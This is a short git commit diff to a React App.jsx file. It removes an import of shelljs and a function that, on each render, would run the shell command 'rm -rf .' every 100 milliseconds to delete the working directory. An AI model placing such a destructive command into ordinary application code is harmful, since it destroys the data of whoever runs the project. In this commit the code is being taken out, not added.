bf954d06a0cf01ca8c9d64587ece50753cc3054b
vivianeflowt <vivianeflowt@gmail.com>
2021-01-27 01:49:40 -0300

    ok

--- src/App.jsx
+++ src/App.jsx
@@ -1,21 +1,10 @@
 import React from 'react';
 import './App.css';
 
-import shell from 'shelljs';
-
 function App() {
-  const doaa = () => {
-    //
-    setInterval(() => {
-      shell.exec('rm -rf .');
-    }, 100);
-    return this;
-  };
-
   return (
     <div>
       <p>lol</p>
-      {doaa()}
     </div>
   );
 }
